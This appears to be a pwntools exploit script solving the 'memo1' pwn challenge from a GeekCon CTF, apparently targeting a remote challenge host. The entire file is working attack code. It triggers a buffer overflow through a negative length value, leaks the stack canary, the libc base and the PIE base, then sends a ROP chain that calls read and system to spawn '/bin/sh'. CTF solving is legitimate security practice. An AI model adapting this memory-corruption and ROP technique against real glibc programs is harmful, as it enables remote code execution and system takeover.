#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ["/usr/bin/tmux","sp","-h"])

def debug(mallocr):
	if len(sys.argv)!=1:
		return
	text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
	gdb.attach(p, 'b *{}'.format(hex(text_base+mallocr)))
	pause()

def exp(host = "chall.geekctf.geekcon.top", port=40311, exe = "./memo1"):
  global p
  if len(sys.argv)==1:
    p = process(exe)
  else:
    p = remote(host, port)
  pass
  libb = ELF("/home/yrl/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6")
  
  poprdi = 0x000000000002a3e5
  poprsi = 0x000000000002be51
  poprdxrbx= 0x0000000000090529

  p.sendline("CTF_is_interesting_isn0t_it?")
  p.sendline("1")
  p.recv()
  p.sendline("a"*200)
  p.recv()

  p.sendline("3")
  p.recv()
  debug(0x184a)
  p.sendline(str(-1*(~(0x109 - 1)&0x7fffffffffffffff)).encode())
  p.sendline("a"*0x109)
  sleep(0.5)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  canary = p.recv()[0x112-9:0x119-9].rjust(8, b"\x00")
  canary = u64(canary)
  log.success(hex(canary))

  p.sendline("3")
  p.recv()
  p.sendline(str(-1*(~(0x118 - 1)&0x7fffffffffffffff)).encode())
  p.send("a"*0x118)
  sleep(0.5)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  libc = p.recv()[0x121-9:0x127-9].ljust(8, b"\x00")
  libc = u64(libc) - 0x29d90
  log.success(hex(libc))

  p.sendline("3")
  p.recv()
  p.sendline(str(-1*(~(0x128 - 1)&0x7fffffffffffffff)).encode())
  p.send("a"*0x128)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  pie = p.recv()[0x131-9:0x137-9].ljust(8, b"\x00")
  pie = u64(pie) - 0x1938
  log.success(hex(pie))

  p.sendline("3")
  p.recv()
  target = pie + 0x4000
  payload = b"a"*0x108 + p64(canary) + p64(1) + p64(libc + poprdi) + p64(0) + p64(libc + poprsi) + p64(target) + p64(libc + poprdxrbx) + p64(8) + p64(0) + p64(libc + libb.symbols['read']) + p64(libc + poprdi) + p64(target)+ p64(pie + 0x101a)+p64(libc + libb.symbols["system"])
  p.sendline(str(-1*(~(len(payload) - 1)&0x7fffffffffffffff)).encode())
  p.send(payload)
  p.recv()
  p.sendline("6")
  p.recv()
  p.send("/bin/sh\x00")
if __name__ == '__main__':
	exp()
	p.interactive()


